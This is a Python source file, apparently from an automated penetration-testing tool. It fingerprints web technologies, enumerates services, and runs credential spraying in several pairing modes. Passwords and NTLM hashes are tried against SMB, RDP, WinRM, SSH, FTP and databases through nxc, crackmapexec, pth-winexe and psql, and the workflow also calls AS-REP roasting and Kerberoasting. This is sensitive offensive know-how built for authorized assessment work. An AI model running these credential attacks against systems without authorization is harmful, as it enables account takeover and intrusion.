def header_lookup(headers: dict[str, str], name: str) -> str:
    wanted = name.lower()
    for key, value in headers.items():
        if key.lower() == wanted:
            return value
    return ""


def detect_web_technologies(headers: dict[str, str], body: str) -> list[str]:
    haystack = "\n".join([f"{k}: {v}" for k, v in headers.items()]) + "\n" + body[:50000]
    checks = {
        "nginx": r"nginx",
        "apache": r"apache",
        "iis": r"microsoft-iis|x-powered-by:\s*asp\.net",
        "php": r"x-powered-by:\s*php|\.php",
        "asp.net": r"asp\.net|__VIEWSTATE",
        "tomcat": r"apache-coyote|tomcat",
        "jenkins": r"jenkins",
        "grafana": r"grafana",
        "kibana": r"kibana",
        "swagger": r"swagger|openapi",
        "graphql": r"graphql|graphiql",
        "spring": r"whitelabel error page|x-application-context|spring",
        "wordpress": r"wp-content|wp-includes",
        "drupal": r"drupal",
        "laravel": r"laravel",
        "express": r"x-powered-by:\s*express",
        "react": r"react|__REACT_DEVTOOLS_GLOBAL_HOOK__",
        "angular": r"ng-version|angular",
        "vue": r"vue",
    }
    found: list[str] = []
    for name, pattern in checks.items():
        if re.search(pattern, haystack, flags=re.I):
            found.append(name)
    return sorted(set(found))


def classify_web_endpoint(endpoint: WebEndpoint) -> tuple[bool, str]:
    path = endpoint.path.lower()
    title = endpoint.title.lower()
    tech = " ".join(endpoint.technologies).lower()
    reasons: list[str] = []
    interesting_paths = [
        "login",
        "admin",
        "swagger",
        "openapi",
        "graphql",
        "actuator",
        "metrics",
        "server-status",
        "phpmyadmin",
    ]
    if any(token in path for token in interesting_paths):
        reasons.append("interesting path")
    if any(token in title for token in ["login", "admin", "dashboard", "swagger", "api", "jenkins", "grafana", "kibana"]):
        reasons.append("interesting title")
    if any(token in tech for token in ["swagger", "graphql", "jenkins", "grafana", "kibana"]):
        reasons.append("interesting technology")
    if endpoint.status_code in {200, 201, 202, 204, 301, 302, 307, 308, 401, 403} and endpoint.path != "/":
        reasons.append(f"status {endpoint.status_code}")
    headers_text = "\n".join(f"{k}: {v}" for k, v in endpoint.headers.items()).lower()
    if any(token in headers_text for token in ["x-jenkins", "x-grafana", "x-kibana", "x-aspnet-version", "x-powered-by"]):
        reasons.append("revealing header")
    return bool(reasons), ", ".join(sorted(set(reasons)))


def is_web_success(endpoint: WebEndpoint) -> bool:
    if not has_http_response(endpoint):
        return False
    if endpoint.status_code in {404, 410} or endpoint.status_code >= 500:
        return False
    ctype = endpoint.content_type.lower()
    if endpoint.title or "html" in ctype or "json" in ctype or endpoint.server:
        return True
    return endpoint.status_code in {200, 201, 202, 204, 301, 302, 307, 308, 401, 403}


def is_reportable_web_endpoint(endpoint: WebEndpoint) -> bool:
    return has_http_response(endpoint)


def has_http_response(endpoint: WebEndpoint) -> bool:
    return is_valid_web_url(endpoint.url) and 100 <= int(endpoint.status_code or 0) <= 599


def is_interesting_fuzz_result(endpoint: WebEndpoint) -> bool:
    if endpoint.status_code in {404, 0}:
        return False
    if endpoint.status_code in {200, 201, 202, 204, 301, 302, 307, 308, 401, 403}:
        return True
    return endpoint.interesting


def maybe_add_web_evidence(endpoint: WebEndpoint, state: ScanState) -> None:
    if not endpoint.interesting:
        return
    severity = "low"
    reason = endpoint.finding_reason or "Interesting web endpoint"
    lower = f"{endpoint.path} {endpoint.title} {' '.join(endpoint.technologies)}".lower()
    if any(token in lower for token in ["swagger", "openapi", "graphql", "actuator", "phpmyadmin", "jenkins"]):
        severity = "medium"
    state.add_evidence(
        Evidence(
            category="web",
            ip=endpoint.ip,
            port=endpoint.port,
            service="web",
            title=f"Web endpoint: {endpoint.url}",
            description=f"{reason}; status={endpoint.status_code}; title={endpoint.title or '-'}",
            raw_output_file=endpoint.raw_headers_file,
            severity=severity,
            data={
                "url": endpoint.url,
                "status_code": endpoint.status_code,
                "title": endpoint.title,
                "technologies": endpoint.technologies,
                "headers": relevant_headers(endpoint.headers),
            },
        )
    )


def relevant_headers(headers: dict[str, str]) -> dict[str, str]:
    wanted = {
        "server",
        "x-powered-by",
        "x-aspnet-version",
        "x-aspnetmvc-version",
        "x-generator",
        "x-runtime",
        "x-version",
        "via",
        "www-authenticate",
        "location",
        "set-cookie",
    }
    return {key: value for key, value in headers.items() if key.lower() in wanted}


def run_web_screenshots(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    if not has_tool("gowitness"):
        logger.warn("gowitness not found; skipping screenshots")
        return
    urls = sorted({endpoint.url for endpoint in state.web_endpoints if is_web_success(endpoint)})
    if not urls:
        return
    screenshot_dir = Path(state.output_dir) / "screenshots"
    screenshot_dir.mkdir(parents=True, exist_ok=True)
    url_file = screenshot_dir / "urls.txt"
    private_write_text(url_file, "\n".join(urls) + "\n")
    commands = [
        ["gowitness", "scan", "file", "-f", str(url_file), "--delay", "3", "--screenshot-path", str(screenshot_dir)],
        ["gowitness", "file", "-f", str(url_file), "--delay", "3", "--screenshot-path", str(screenshot_dir)],
    ]
    for command in commands:
        result = run_command(
            command,
            timeout=max(120, len(urls) * 15),
            output_file=Path(state.output_dir) / RAW_DIR / "web" / "gowitness.command.txt",
            logger=logger,
        )
        if result.returncode == 0:
            logger.info("Screenshots completed with gowitness")
            return
    logger.warn("gowitness failed with known command formats; screenshots were not captured")


def run_reauth_workflow(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    if not service_auth_workflow_enabled(args):
        logger.info("Reautenticação ignorada pelo escopo web-only/skip-service-enum")
        return
    if not state.services:
        logger.warn("No services available for re-authentication")
        return
    logger.info("Running re-authentication workflow...")
    run_smb_ad_enum(args, state, logger)
    run_credential_auth_enumeration(args, state, logger)
    run_enum4linux_for_valid_smb_credentials(args, state, logger)
    run_asrep_roasting(args, state, logger)
    run_kerberoasting(args, state, logger)
    run_smb_share_mapping(args, state, logger)
    save_state(state)


def service_auth_workflow_enabled(args: argparse.Namespace) -> bool:
    """Credential and post-auth service work must respect the operator's scope flags."""
    return not args.web_only


def run_service_enumeration(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    if args.skip_service_enum or args.web_only:
        logger.info("Skipping service enumeration")
        return
    if not state.services:
        logger.info("No services available for service enumeration")
        return
    logger.info("Running safe service enumeration modules")
    run_smb_ad_enum(args, state, logger)
    run_rdp_enum(args, state, logger)
    run_ssh_enum(args, state, logger)
    run_ftp_enum(args, state, logger)
    run_database_enum(args, state, logger)
    run_generic_service_enum(args, state, logger)
    run_kerberos_user_enum_if_enabled(args, state, logger)
    if getattr(args, "enable_user_enum", False):
        run_kerbrute_user_enum(args, state, logger)
    # NOTE: credential auth enumeration is now called separately in main()
    # so it always runs when credentials are supplied, even with --skip-service-enum.
    save_state(state)


def services_by_ports(
    state: ScanState,
    ports: set[int],
    protocols: set[str] | None = None,
) -> list[ServiceRecord]:
    if protocols is None:
        return [service for service in state.services if service.port in ports]
    return [service for service in state.services if service.protocol in protocols and service.port in ports]


def services_for_group(
    state: ScanState,
    group_name: str,
    protocols: set[str] | None = None,
) -> list[ServiceRecord]:
    services = [
        service
        for service in state.services
        if service_group_name(service) == group_name and (protocols is None or service.protocol in protocols)
    ]
    return sorted(services, key=lambda item: (ip_sort_key(item.ip), item.port, item.protocol))


def services_by_ports_or_group(
    state: ScanState,
    ports: set[int],
    group_name: str,
    protocols: set[str] | None = None,
) -> list[ServiceRecord]:
    services = [
        service
        for service in state.services
        if (service.port in ports or service_group_name(service) == group_name)
        and (protocols is None or service.protocol in protocols)
    ]
    return sorted_services_unique(services)


def services_by_ports_or_tokens(
    state: ScanState,
    ports: set[int],
    tokens: Iterable[str],
    protocols: set[str] | None = None,
) -> list[ServiceRecord]:
    token_list = [token.lower() for token in tokens if token]
    services = []
    for service in state.services:
        if protocols is not None and service.protocol not in protocols:
            continue
        descriptor = f"{service.service} {service.product} {service.version} {service.banner}".lower()
        if service.port in ports or any(token in descriptor for token in token_list):
            services.append(service)
    return sorted_services_unique(services)


def sorted_services_unique(services: Iterable[ServiceRecord]) -> list[ServiceRecord]:
    unique: dict[tuple[str, int, str], ServiceRecord] = {}
    for service in services:
        unique.setdefault((service.ip, service.port, service.protocol), service)
    return sorted(unique.values(), key=lambda item: (ip_sort_key(item.ip), item.port, item.protocol))


def unique_ips_for_ports(state: ScanState, ports: set[int]) -> list[str]:
    return sorted({service.ip for service in services_by_ports(state, ports, {"tcp"})})


def credential_args(args: argparse.Namespace, tool: str = "nxc", domain: str = "") -> tuple[list[str], list[str]]:
    command_args: list[str] = []
    secrets: list[str] = []
    eff_domain = domain if domain is not None else getattr(args, "domain", "")
    if not domain and getattr(args, "domain", "") and "," not in getattr(args, "domain", ""):
        eff_domain = getattr(args, "domain", "")
        
    if eff_domain:
        if tool in {"nxc", "crackmapexec"}:
            command_args.extend(["-d", eff_domain])
        else:
            command_args.append(eff_domain)
    if args.username:
        if tool in {"nxc", "crackmapexec"}:
            command_args.extend(["-u", args.username])
        else:
            command_args.append(args.username)
    if args.password:
        secrets.append(args.password)
        if tool in {"nxc", "crackmapexec"}:
            command_args.extend(["-p", args.password])
        else:
            command_args.append(args.password)
    if args.ntlm_hash:
        secrets.append(args.ntlm_hash)
        if tool in {"nxc", "crackmapexec"}:
            command_args.extend(["-H", args.ntlm_hash])
        else:
            command_args.append(args.ntlm_hash)
    if args.kerberos and tool in {"nxc", "crackmapexec"}:
        command_args.append("-k")
    return command_args, secrets


@dataclass(frozen=True)
class CredentialPair:
    username: str
    password: str
    is_hash: bool = False
    domain: str = ""


def credential_pair_slug(pair: CredentialPair) -> str:
    method = "hash" if pair.is_hash else "password"
    digest = hashlib.sha256(pair.password.encode("utf-8", errors="surrogateescape")).hexdigest()[:12]
    principal = f"{pair.domain}_{pair.username}" if pair.domain else pair.username
    return safe_filename(f"{principal or 'anonymous'}_{method}_{digest}")


def load_credential_list_file(path: str | None, *, strip_inline_comments: bool = True) -> list[str]:
    if not path:
        return []
    file_path = Path(path)
    if not file_path.is_file():
        return []
    entries: list[str] = []
    for line in file_path.read_text(encoding="utf-8", errors="replace").splitlines():
        token = line.strip()
        if not token or token.startswith("#"):
            continue
        if strip_inline_comments and "#" in token:
            token = token.split("#", 1)[0].strip()
        if token:
            entries.append(token)
    return entries


def collect_domains(args: argparse.Namespace) -> list[str]:
    domain_arg = getattr(args, "domain", "")
    if not domain_arg:
        return [""]
    return [d.strip() for d in domain_arg.split(",") if d.strip()] or [""]


def collect_credential_usernames(args: argparse.Namespace) -> list[str]:
    users: list[str] = []
    if args.username:
        users.append(args.username)
    users.extend(load_credential_list_file(getattr(args, "username_file", None)))
    return users


def collect_credential_passwords(args: argparse.Namespace) -> list[str]:
    passwords: list[str] = []
    if args.password:
        passwords.append(args.password)
    passwords.extend(load_credential_list_file(getattr(args, "password_file", None), strip_inline_comments=False))
    return passwords


def collect_credential_hashes(args: argparse.Namespace) -> list[str]:
    hashes: list[str] = []
    if args.ntlm_hash:
        hashes.append(args.ntlm_hash)
    hashes.extend(load_credential_list_file(getattr(args, "ntlm_hash_file", None), strip_inline_comments=False))
    return hashes


def resolve_auth_attack_mode(args: argparse.Namespace) -> str:
    mode = getattr(args, "auth_attack_mode", "pitchfork") or "pitchfork"
    if mode != "auto":
        return mode
    has_user_file = bool(getattr(args, "username_file", None))
    has_pass_file = bool(getattr(args, "password_file", None))
    has_hash_file = bool(getattr(args, "ntlm_hash_file", None))
    users = collect_credential_usernames(args)
    passwords = collect_credential_passwords(args) or collect_credential_hashes(args)
    if has_user_file and (has_pass_file or has_hash_file):
        return "clusterbomb"
    if args.username and has_pass_file:
        return "single-user"
    if has_user_file and args.password:
        return "single-pass"
    if len(users) <= 1 and len(passwords) <= 1:
        return "single-user"
    if len(users) == 1 and len(passwords) > 1:
        return "single-user"
    if len(users) > 1 and len(passwords) == 1:
        return "single-pass"
    if len(users) > 1 and len(passwords) > 1:
        return "clusterbomb"
    return "single-user"


def iter_credential_pairs(args: argparse.Namespace) -> Iterable[CredentialPair]:
    mode = resolve_auth_attack_mode(args)
    users = collect_credential_usernames(args)
    passwords = collect_credential_passwords(args)
    hashes = collect_credential_hashes(args)
    domains = collect_domains(args)
    combined: list[tuple[str, bool]] = [(p, False) for p in passwords] + [(h, True) for h in hashes]
    if not combined:
        return
    if not users:
        users = [""]
    if mode == "pitchfork":
        for domain in domains:
            # Preserve pitchfork pairing within each credential type so that
            # supplying both a password and a hash never silently drops one.
            if passwords and hashes:
                for username, secret in zip(users, passwords):
                    yield CredentialPair(username, secret, False, domain)
                for username, secret in zip(users, hashes):
                    yield CredentialPair(username, secret, True, domain)
            else:
                for username, (secret, is_hash) in zip(users, combined):
                    yield CredentialPair(username, secret, is_hash, domain)
    elif mode == "clusterbomb":
        for domain in domains:
            for username in users:
                for secret, is_hash in combined:
                    yield CredentialPair(username, secret, is_hash, domain)
    elif mode == "single-user":
        username = users[0]
        for domain in domains:
            for secret, is_hash in combined:
                yield CredentialPair(username, secret, is_hash, domain)
    elif mode == "single-pass":
        secret, is_hash = combined[0]
        for domain in domains:
            for username in users:
                yield CredentialPair(username, secret, is_hash, domain)


def credential_pair_count(args: argparse.Namespace) -> int:
    mode = resolve_auth_attack_mode(args)
    user_count = max(1, len(collect_credential_usernames(args)))
    password_count = len(collect_credential_passwords(args))
    hash_count = len(collect_credential_hashes(args))
    secret_count = password_count + hash_count
    if not secret_count:
        return 0
    if mode == "pitchfork":
        per_domain = (
            min(user_count, password_count) + min(user_count, hash_count)
            if password_count and hash_count
            else min(user_count, secret_count)
        )
    elif mode == "clusterbomb":
        per_domain = user_count * secret_count
    elif mode == "single-user":
        per_domain = secret_count
    elif mode == "single-pass":
        per_domain = user_count
    else:
        per_domain = 0
    return len(collect_domains(args)) * per_domain


def build_credential_pairs(args: argparse.Namespace) -> tuple[list[CredentialPair], str]:
    """Compatibility helper for tests/UI; execution streams pairs lazily."""
    return list(iter_credential_pairs(args)), resolve_auth_attack_mode(args)


def has_automated_credential_spray(args: argparse.Namespace) -> bool:
    return credential_pair_count(args) > 0


def credential_args_for_attempt(
    args: argparse.Namespace,
    tool: str = "nxc",
    *,
    username: str = "",
    password: str = "",
    is_hash: bool = False,
    domain: str = "",
) -> tuple[list[str], list[str]]:
    command_args: list[str] = []
    secrets: list[str] = []
    eff_domain = domain if domain else ""
    if not eff_domain and getattr(args, "domain", "") and "," not in getattr(args, "domain", ""):
        eff_domain = getattr(args, "domain", "")
    if eff_domain:
        if tool in {"nxc", "crackmapexec"}:
            command_args.extend(["-d", eff_domain])
        else:
            command_args.append(eff_domain)
    if username:
        if tool in {"nxc", "crackmapexec"}:
            command_args.extend(["-u", username])
        else:
            command_args.append(username)
    elif getattr(args, "ntlm_hash", None) and tool in {"nxc", "crackmapexec"}:
        # NXC requires -u even with -H; use empty string
        command_args.extend(["-u", ""])
        
    if password:
        secrets.append(password)
        if tool in {"nxc", "crackmapexec"}:
            command_args.extend(["-H" if is_hash else "-p", password])
        else:
            command_args.append(password)
    if args.kerberos and tool in {"nxc", "crackmapexec"}:
        command_args.append("-k")
    return command_args, secrets


def nxc_auth_success(text: str) -> bool:
    for line in text.splitlines():
        stripped = line.strip()
        if not stripped:
            continue
        lower = stripped.lower()
        if stripped.startswith("[-]") or "status_logon_failure" in lower or "login failed" in lower:
            continue
        if "(guest)" in lower:
            continue
        if "[+]" in stripped:
            return True
    return False


def record_auth_attempt_evidence(
    state: ScanState,
    service: ServiceRecord,
    *,
    category: str,
    protocol: str,
    tool: str,
    pair: CredentialPair,
    mode: str,
    success: bool,
    command: str,
    raw_output_file: str,
    transcript: str = "",
    uses_hash: bool = False,
) -> None:
    # Only report successful authentications; rejected ones are still in raw files
    if not success:
        return
    principal_display = f"{pair.domain}\\{pair.username}" if pair.domain and pair.username else pair.username
    username_display = principal_display or "(anonymous)"
    title_display = username_display
    
    display_command = command
        
    severity = "high" if protocol in {"smb", "rdp", "winrm", "mssql"} else "medium"
    auth_method = "hash" if (uses_hash or pair.is_hash) else "password"
    description = (
        f"{tool} authentication accepted for {title_display} on "
        f"{service.protocol.upper()}/{service.port} (mode={mode}, method={auth_method})."
    )
    state.add_evidence(
        Evidence(
            category=category,
            ip=service.ip,
            port=service.port,
            service=protocol,
            title=f"Auth accepted: {title_display} ({protocol})",
            description=description,
            command=display_command,
            raw_output_file=raw_output_file,
            severity=severity,
            data={
                "auth_result": "accepted",
                "auth_mode": mode,
                "auth_method": auth_method,
                "username": pair.username,
                "password": pair.password if not pair.is_hash else "",
                "ntlm_hash": pair.password if (uses_hash or pair.is_hash) else "",
                "domain": pair.domain,
                "protocol": protocol,
                "tool": tool,
                "output_excerpt": transcript[:4000],
            },
        )
    )


def auth_protocols_for_service(service: ServiceRecord) -> list[tuple[str, str]]:
    group = service_group_name(service)
    service_name = (service.service or "").lower()
    descriptor = f"{service_name} {service.product.lower()} {service.version.lower()} {service.banner.lower()}"
    protocols: list[tuple[str, str]] = []
    if group == "SMB":
        if has_tool("nxc"):
            protocols.append(("smb", "nxc"))
        if has_tool("crackmapexec"):
            protocols.append(("smb", "crackmapexec"))
        if has_tool("pth-winexe"):
            protocols.append(("smb", "pth-winexe"))
    elif group == "LDAP/AD":
        if has_tool("nxc"):
            protocols.append(("ldap", "nxc"))
    elif group == "RDP":
        if has_tool("nxc"):
            protocols.append(("rdp", "nxc"))
    elif group == "FTP":
        protocols.append(("ftp", "native"))
        if has_tool("nxc"):
            protocols.append(("ftp", "nxc"))
    elif group == "WINRM":
        if has_tool("nxc"):
            protocols.append(("winrm", "nxc"))
    elif group == "SSH":
        if has_tool("nxc"):
            protocols.append(("ssh", "nxc"))
    elif group == "DATABASE/DATA":
        if service.port in MYSQL_PORTS or "mysql" in descriptor:
            if has_tool("nxc"):
                protocols.append(("mysql", "nxc"))
        if service.port in MSSQL_PORTS or any(token in descriptor for token in ["ms-sql", "mssql", "sql server"]):
            if has_tool("nxc"):
                protocols.append(("mssql", "nxc"))
        if service.port in POSTGRES_PORTS or "postgres" in descriptor:
            if shutil.which("psql"):
                protocols.append(("postgres", "psql"))
    return protocols


def auth_capable_services(state: ScanState) -> list[ServiceRecord]:
    services: list[ServiceRecord] = []
    for service in state.services:
        if service.protocol != "tcp":
            continue
        if auth_protocols_for_service(service):
            services.append(service)
    unique = sorted_services_unique(services)
    smb_services = [service for service in unique if service_group_name(service) == "SMB"]
    other_services = [service for service in unique if service_group_name(service) != "SMB"]
    return sorted_services_unique(other_services + preferred_smb_services(state, smb_services))


def run_nxc_auth_attempt(
    args: argparse.Namespace,
    state: ScanState,
    logger: Logger,
    raw_dir: Path,
    service: ServiceRecord,
    protocol: str,
    pair: CredentialPair,
    mode: str,
    uses_hash: bool,
) -> None:
    cred_args, secrets = credential_args_for_attempt(args, "nxc", username=pair.username, password=pair.password, is_hash=pair.is_hash, domain=pair.domain)
    if not cred_args and not uses_hash:
        return
    command = ["nxc", protocol, service.ip, "--port", str(service.port)] + cred_args
    slug = credential_pair_slug(pair)
    output_file = raw_dir / f"nxc_{protocol}_{safe_filename(service.ip)}_{service.port}_{slug}.txt"
    result = run_service_command(command, output_file, args, logger, secrets)
    success = nxc_auth_success(result.stdout + result.stderr)
    record_auth_attempt_evidence(
        state,
        service,
        category=protocol,
        protocol=protocol,
        tool="nxc",
        pair=pair,
        mode=mode,
        success=success,
        command=shell_join(result.redacted_command),
        raw_output_file=relpath(result.output_file or "", state.output_dir),
        transcript=result.stdout + result.stderr,
        uses_hash=uses_hash,
    )


def run_crackmapexec_auth_attempt(
    args: argparse.Namespace,
    state: ScanState,
    logger: Logger,
    raw_dir: Path,
    service: ServiceRecord,
    pair: CredentialPair,
    mode: str,
    uses_hash: bool,
) -> None:
    cred_args, secrets = credential_args_for_attempt(args, "crackmapexec", username=pair.username, password=pair.password, is_hash=pair.is_hash, domain=pair.domain)
    if not cred_args and not uses_hash:
        return
    command = ["crackmapexec", "smb", service.ip, "--port", str(service.port)] + cred_args
    slug = credential_pair_slug(pair)
    output_file = raw_dir / f"cme_smb_{safe_filename(service.ip)}_{service.port}_{slug}.txt"
    result = run_service_command(command, output_file, args, logger, secrets)
    success = nxc_auth_success(result.stdout + result.stderr)
    record_auth_attempt_evidence(
        state,
        service,
        category="smb",
        protocol="smb",
        tool="crackmapexec",
        pair=pair,
        mode=mode,
        success=success,
        command=shell_join(result.redacted_command),
        raw_output_file=relpath(result.output_file or "", state.output_dir),
        transcript=result.stdout + result.stderr,
        uses_hash=uses_hash,
    )


def run_pth_winexe_auth_attempt(
    args: argparse.Namespace,
    state: ScanState,
    logger: Logger,
    raw_dir: Path,
    service: ServiceRecord,
    pair: CredentialPair,
    mode: str,
    uses_hash: bool,
) -> None:
    if not pair.username:
        return
    pth_auth = f"{pair.domain + '/' if pair.domain else ''}{pair.username}%{pair.password or ''}"
    command = ["pth-winexe", "-U", pth_auth, f"//{service.ip}", "ipconfig"]
    slug = credential_pair_slug(pair)
    output_file = raw_dir / f"pth_winexe_{safe_filename(service.ip)}_{service.port}_{slug}.txt"
    secrets = [pair.password] if pair.password else []
    result = run_service_command(command, output_file, args, logger, secrets)
    
    success = result.returncode == 0 and ("Windows IP" in result.stdout or "IPv4" in result.stdout or "ipconfig" in result.stdout.lower())
    record_auth_attempt_evidence(
        state,
        service,
        category="smb",
        protocol="smb",
        tool="pth-winexe",
        pair=pair,
        mode=mode,
        success=success,
        command=shell_join(redact_command(command, secrets)),
        raw_output_file=relpath(result.output_file or "", state.output_dir),
        transcript=result.stdout + result.stderr,
        uses_hash=uses_hash,
    )


def run_postgres_auth_attempt(
    args: argparse.Namespace,
    state: ScanState,
    logger: Logger,
    raw_dir: Path,
    service: ServiceRecord,
    pair: CredentialPair,
    mode: str,
) -> None:
    if not pair.username:
        return
    env = os.environ.copy()
    secrets: list[str] = []
    if pair.password:
        env["PGPASSWORD"] = pair.password
        secrets.append(pair.password)
    command = [
        "psql",
        "-h",
        service.ip,
        "-p",
        str(service.port),
        "-U",
        pair.username,
        "-d",
        "postgres",
    ]
    slug = credential_pair_slug(pair)
    output_file = raw_dir / f"psql_{safe_filename(service.ip)}_{service.port}_{slug}.txt"
    result = run_command(
        command,
        timeout=command_timeout(THREAD_LEVELS[args.threads_level]["timeout"], args, multiplier=3.0),
        output_file=output_file,
        logger=logger,
        secrets=secrets,
        env=env,
        input_text="SELECT version(); \\l\n",
    )
    combined = result.stdout + result.stderr
    lower = combined.lower()
    # Psql returns 0 on success. If the default "postgres" DB is missing, it returns > 0 but auth was still successful if no auth error is present.
    auth_failed = "authentication failed" in lower or "fe_sendauth: no password supplied" in lower
    db_missing = "database" in lower and "does not exist" in lower
    success = (result.returncode == 0) or (not auth_failed and db_missing)
    record_auth_attempt_evidence(
        state,
        service,
        category="database",
        protocol="postgres",
        tool="psql",
        pair=pair,
        mode=mode,
        success=success,
        command=shell_join(redact_command(command, secrets)),
        raw_output_file=relpath(result.output_file or "", state.output_dir),
        transcript=combined,
    )


def run_credential_auth_enumeration(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    mode = resolve_auth_attack_mode(args)
    pair_count = credential_pair_count(args)
    if pair_count == 0:
        return
    users = collect_credential_usernames(args)
    passwords = collect_credential_passwords(args)
    warn_credential_list_size_mismatch(args, mode, users, passwords, logger, state)
    services = auth_capable_services(state)
    if not services:
        logger.info("No auth-capable services found for credential attempts")
        return
    state.metadata["credential_spray_mode"] = mode
    state.metadata["credential_spray_pairs"] = pair_count
    state.metadata["credential_lists_execute_automated_spray"] = True
    logger.info(
        f"Running credential attempts mode={mode} with {pair_count} pair(s) across "
        f"{len(services)} auth-capable service target(s)"
    )
    raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "auth"
    raw_dir.mkdir(parents=True, exist_ok=True)
    for pair in iter_credential_pairs(args):
        for service in services:
            for protocol, tool in auth_protocols_for_service(service):
                # Skip tools incompatible with current auth method
                if not pair.is_hash and tool == "pth-winexe":
                    continue
                if (pair.is_hash and tool in {"psql"}) or (pair.is_hash and tool == "native" and protocol == "ftp"):
                    continue
                if tool == "nxc":
                    run_nxc_auth_attempt(args, state, logger, raw_dir, service, protocol, pair, mode, pair.is_hash)
                elif tool == "crackmapexec":
                    run_crackmapexec_auth_attempt(args, state, logger, raw_dir, service, pair, mode, pair.is_hash)
                elif tool == "pth-winexe":
                    run_pth_winexe_auth_attempt(args, state, logger, raw_dir, service, pair, mode, pair.is_hash)
                elif tool == "psql":
                    run_postgres_auth_attempt(args, state, logger, raw_dir, service, pair, mode)
                elif tool == "native" and protocol == "ftp":
                    ftp_raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "ftp"
                    ftp_raw_dir.mkdir(parents=True, exist_ok=True)
                    timeout = THREAD_LEVELS[args.threads_level]["timeout"]
                    success, transcript = try_ftp_login(service.ip, service.port, pair.username, pair.password, timeout)
                    slug = credential_pair_slug(pair)
                    ftp_raw_file = ftp_raw_dir / f"ftp_auth_{safe_filename(service.ip)}_{service.port}_{slug}.txt"
                    private_write_text(ftp_raw_file, transcript)
                    record_auth_attempt_evidence(
                        state, service, category="ftp", protocol="ftp", tool="ftp",
                        pair=pair, mode=mode, success=success,
                        command=f"ftp {service.ip} {service.port} # user={pair.username}",
                        raw_output_file=relpath(ftp_raw_file, state.output_dir),
                        transcript=transcript,
                    )


def run_smb_ad_enum(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    services = services_for_group(state, "SMB", {"tcp"})
    if not services:
        return
    raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "smb"
    raw_dir.mkdir(parents=True, exist_ok=True)
    suffix = "_reauth" if getattr(args, "reauth_only", False) else ""
    for service in services:
        ip = service.ip
        port = service.port
        if has_tool("nxc"):
            for domain in collect_domains(args):
                dsuffix = f"_{safe_filename(domain)}" if domain else ""
                cred_args, secrets = credential_args(args, "nxc", domain)
                command = ["nxc", "smb", ip, "--port", str(port)] + cred_args
                result = run_service_command(command, raw_dir / f"nxc_smb_{safe_filename(ip)}_{port}{suffix}{dsuffix}.txt", args, logger, secrets)
                add_tool_evidence(state, "smb", ip, port, "nxc smb", result, parse_smb_keywords(result.stdout + result.stderr))
                update_host_from_smb_text(state, ip, result.stdout + result.stderr)
                if args.username or args.password or args.ntlm_hash or getattr(args, "username_file", None) or getattr(args, "password_file", None):
                    shares_command = ["nxc", "smb", ip, "--port", str(port)] + cred_args + ["--shares"]
                    shares_result = run_service_command(shares_command, raw_dir / f"nxc_smb_shares_{safe_filename(ip)}_{port}{suffix}{dsuffix}.txt", args, logger, secrets)
                    add_tool_evidence(state, "smb", ip, port, "nxc smb shares", shares_result, parse_smb_keywords(shares_result.stdout + shares_result.stderr))
        if has_tool("crackmapexec"):
            for domain in collect_domains(args):
                dsuffix = f"_{safe_filename(domain)}" if domain else ""
                cred_args, secrets = credential_args(args, "crackmapexec", domain)
                command = ["crackmapexec", "smb", ip, "--port", str(port)] + cred_args
                result = run_service_command(command, raw_dir / f"cme_smb_{safe_filename(ip)}_{port}{suffix}{dsuffix}.txt", args, logger, secrets)
                add_tool_evidence(state, "smb", ip, port, "crackmapexec smb", result, parse_smb_keywords(result.stdout + result.stderr))
                update_host_from_smb_text(state, ip, result.stdout + result.stderr)
        if has_tool("smbclient"):
            command = ["smbclient", "-L", f"//{ip}", "-U", "%", "-N", "-p", str(port)]
            result = run_service_command(command, raw_dir / f"smbclient_list_{safe_filename(ip)}_{port}{suffix}.txt", args, logger, [])
            add_tool_evidence(state, "smb", ip, port, "smbclient anonymous list", result, parse_smb_keywords(result.stdout + result.stderr))
            anonymous_shares = parse_smbclient_share_listing(result.stdout)
            if anonymous_shares:
                state.add_evidence(
                    Evidence(
                        category="smb",
                        ip=ip,
                        port=port,
                        service="smb",
                        title="SMB shares visible anonymously",
                        description=f"smbclient returned share listing with anonymous/null authentication on TCP/{port}.",
                        command=shell_join(result.redacted_command),
                        raw_output_file=relpath(result.output_file or "", state.output_dir),
                        severity="medium",
                        data={
                            "auth_result": "accepted",
                            "auth_method": "anonymous",
                            "username": "",
                            "password": "",
                            "domain": "",
                            "protocol": "smb",
                            "tool": "smbclient",
                            "anonymous_or_null_session": True,
                            "shares": [{"name": name, "permissions": ["VISIBLE"]} for name in anonymous_shares],
                        },
                    )
                )
        if has_tool("impacket-smbclient"):
            for domain in collect_domains(args):
                dsuffix = f"_{safe_filename(domain)}" if domain else ""
                impacket_input = raw_dir / f"impacket_smbclient_{safe_filename(ip)}_{port}{suffix}{dsuffix}.commands"
                private_write_text(impacket_input, "shares\nexit\n")
                command, secrets = build_impacket_smbclient_command(args, ip, port, impacket_input, domain)
                result = run_service_command(command, raw_dir / f"impacket_smbclient_{safe_filename(ip)}_{port}{suffix}{dsuffix}.txt", args, logger, secrets)
                add_tool_evidence(state, "smb", ip, port, "impacket-smbclient shares", result, parse_smb_keywords(result.stdout + result.stderr))
        if has_tool("rpcclient"):
            command = ["rpcclient", "-U", "", "-N", ip, "-p", str(port), "-c", "srvinfo"]
            result = run_service_command(command, raw_dir / f"rpcclient_srvinfo_{safe_filename(ip)}_{port}{suffix}.txt", args, logger, [])
            add_tool_evidence(state, "rpc", ip, port, "rpcclient srvinfo", result, parse_smb_keywords(result.stdout + result.stderr))
            update_host_from_smb_text(state, ip, result.stdout + result.stderr)
    run_ad_discovery_helpers(args, state, logger)


def smb_enum_credentials_by_endpoint(
    state: ScanState,
) -> dict[tuple[str, int], tuple[ServiceRecord, list[dict[str, str]]]]:
    """Keep credentials bound to their endpoint; merge 139 into 445 only when equivalent."""
    credentials_by_target = detect_auth_credentials_from_evidence(state)
    services_by_host: dict[str, list[ServiceRecord]] = {}
    for service in services_for_group(state, "SMB", {"tcp"}):
        services_by_host.setdefault(service.ip, []).append(service)
    result: dict[tuple[str, int], tuple[ServiceRecord, list[dict[str, str]]]] = {}
    for ip, services in services_by_host.items():
        selected = preferred_smb_services(state, services)
